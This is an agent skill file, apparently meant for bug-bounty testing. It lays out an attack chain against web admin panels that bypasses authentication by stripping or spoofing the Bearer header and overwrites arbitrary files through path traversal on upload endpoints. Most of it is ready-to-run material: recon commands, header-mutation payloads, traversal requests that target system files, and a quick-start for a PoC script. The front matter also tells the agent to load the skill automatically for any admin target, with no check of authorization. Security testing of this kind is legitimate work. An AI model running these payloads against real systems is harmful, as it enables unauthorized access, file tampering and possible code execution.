---
name: bb-auth-bypass-file-overwrite
description: Web2 security skill for exploiting auth bypass via Bearer header stripping combined with arbitrary file overwrite via path traversal. Use when a target admin SPA (React/Vue/Angular) authenticates via JWT Bearer tokens and exposes a file upload endpoint with user-controlled path parameters (fullFilePath, filename, dest, path). CVSS 8.1-9.1 High to Critical. Automatically load when user provides an admin panel target with file upload. See references/ for exploitation chain, evasion, report template, and scripts/ for runnable PoC.
---

# Skill: Auth Bypass via Bearer Header Stripping + Arbitrary File Overwrite via Path Traversal

## 0. When to Use This Skill
Use this skill when **all** of the following are true:
- Target is a web application with a separate frontend (React, Vue, Angular, Next.js) serving an admin panel.
- Authentication uses `Authorization: Bearer <JWT>` headers for API communication.
- An upload or resource management endpoint exists (e.g., `/api/upload-resource`, `/upload`, `/api/files`).
- You suspect client-side-only access control or loose server-side Bearer token format validation.

**Skip this skill if:** The server enforces strict JWT signature validation and path canonicalization on every request, or the application uses session cookies exclusively (not Bearer tokens) for admin auth.

---

## 1. Meta-Data
- **Category:** Broken Access Control / Business Logic / File Upload
- **Target Component:** Client-Side Rendered Admin Panels (React/Vue/Angular) + REST API Upload Endpoints
- **Complexity:** Medium — requires proxy interception, JS endpoint discovery, and path traversal testing
- **Estimated CVSS:** 8.1 (High) for auth bypass + arbitrary read/write (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N); escalates to **9.1 (Critical)** if RCE is achievable via file overwrite
- **CWE:** CWE-287 (Improper Authentication), CWE-22 (Path Traversal), CWE-434 (Unrestricted File Upload)
- **OWASP:** A01:2021 — Broken Access Control
- **Reference:** OWASP Testing Guide v4.2 — OTG-AUTHN-001, OTG-AUTHZ-002, OTG-BUSLOGIC-009

---

## 2. Prerequisites (Trigger Conditions)
- [ ] Application uses a separate SPA frontend (React/Vue/Angular) for the admin interface with public rendering.
- [ ] Authentication is handled via `Authorization: Bearer <JWT>` headers — not session cookies.
- [ ] An upload endpoint exists (e.g., `/upload`, `/api/upload-resource`) accessible from the admin UI.
- [ ] The upload endpoint accepts a user-controlled parameter that defines the destination path (e.g., `fullFilePath`, `filename`, `path`, `parent`, `dest`).
- [ ] Server-side validation of the Bearer scheme prefix is absent or incomplete.
- [ ] File path validation does not canonicalize or jail paths before writing to disk.

---

## 3. Reconnaissance & Detection

### 3.1 Identify the Admin Interface

```bash
# Subdomain enumeration targeting admin panels
subfinder -d target.com -silent | grep -iE "admin|manage|dashboard|control|panel|staff|internal"
amass enum -passive -d target.com | grep -iE "admin|cms|mgmt|backoffice"

# Path brute-force on the main domain
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,403 \
     -fc 404 -t 50

# Specific admin path patterns
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -u https://target.com/FUZZ \
     -mc 200,301 \
     -t 30 \
     -fl 0 \
     -fs 0
```

### 3.2 Extract API Endpoints from JavaScript Bundles

```bash
# Step 1: Extract all JS file URLs from the page
curl -s https://admin.target.com | grep -oP '(?<=src=")[^"]+\.js' | sort -u

# Step 2: Fetch each bundle and search for endpoint patterns
for js_url in $(curl -s https://admin.target.com | grep -oP '(?<=src=")[^"]+\.js'); do
    curl -s "https://admin.target.com${js_url}" | \
    grep -oP '(["'"'"'])(\/api\/[a-zA-Z0-9\/\-_?=&]+)\1' | \
    sort -u
done

# Step 3: Search for upload-specific keywords
for js_url in $(curl -s https://admin.target.com | grep -oP '(?<=src=")[^"]+\.js'); do
    curl -s "https://admin.target.com${js_url}" | \
    grep -iE "upload|file|resource|fullFilePath|filename|multipart" | \
    head -20
done
```

### 3.3 Test Bearer Header Stripping Bypass

Set up Burp Suite with the admin panel proxied, then test the following header mutations on any admin-only API endpoint:

```
# Original (authenticated)
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Variant 1: Strip "Bearer " prefix — send raw token only
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Variant 2: Remove header entirely
(no Authorization header)

# Variant 3: Empty Bearer
Authorization: Bearer

# Variant 4: Null/whitespace token
Authorization: Bearer null

# Variant 5: Alternative internal-IP spoofing (if auth fails)
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

### 3.4 Check Upload Endpoint for Path Traversal

```bash
# Probe for path parameters using common names
# Intercept a legitimate upload and look for these parameters:
# - fullFilePath, filePath, path, filename, dest, destination, parent, folder, dir

# Baseline: upload to legitimate path
POST /api/upload-resource?owner=built-in&user=admin&fullFilePath=resource%2Ftest.txt&provider=provider_storage_local_file_system

# Path traversal probe: attempt to write outside the resource root
POST /api/upload-resource?owner=built-in&user=admin&fullFilePath=resource%2F%2e%2e%2Ftest.txt&provider=provider_storage_local_file_system
#                                                                          ^^^^^ URL-encoded ../

# Deep traversal: target web root or config files
POST /api/upload-resource?...&fullFilePath=resource%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd
```

### 3.5 Historical Endpoint Discovery

```bash
# Check Wayback Machine for old API endpoint patterns
waybackurls target.com | grep -iE "upload|file|resource|api" | sort -u

# gau (Get All URLs)
gau admin.target.com | grep -iE "upload|file|resource|api"
```

### 3.6 Vulnerability Decision Table

| Observed Behavior | Verdict |
|---|---|
| Admin panel returns `200 OK` with raw token (no "Bearer " prefix) | **VULNERABLE — Auth Bypass Confirmed** |
| Admin panel returns `200 OK` with no `Authorization` header | **VULNERABLE — No Auth Enforced Server-Side** |
| Admin panel returns `401` for all header variants except valid `Bearer <token>` | Not vulnerable to header stripping |
| Upload endpoint writes file to traversed path (`../../target_file.html`) with no error | **VULNERABLE — Path Traversal Confirmed** |
| Upload endpoint returns `400` or `403` for any `../` in path parameter | Likely filtered — test encoding variants |
| Upload endpoint sanitizes path but writes to predictable location | Partial — pivot to overwriting accessible web assets |

---

## 4. Next Steps

All detailed exploitation, evasion, PoC code, and report templates are in `references/` and `scripts/`:

| File | Contents |
|---|---|
| `references/exploitation.md` | Full step-by-step exploitation chain (Steps 1–5) + vulnerable vs. patched code patterns |
| `references/evasion.md` | Path traversal encoding variants, null byte injection, alternative auth header bypasses |
| `references/report-template.md` | Bug bounty report template (title, summary, impact, steps to reproduce, recommended fix) |
| `scripts/poc.py` | Runnable Python PoC — tests auth bypass + path traversal in one command |

```bash
# Quick start after confirming target matches prerequisites:
cd scripts/
pip install requests requests-toolbelt
python3 poc.py --target https://admin.target.com --token <JWT>
```

> **References:** OWASP Path Traversal (CWE-22), OWASP Broken Access Control (A01:2021),
> PortSwigger File Path Traversal, RFC 6750 Bearer Token Usage,
> PayloadsAllTheThings Path Traversal Cheat Sheet.
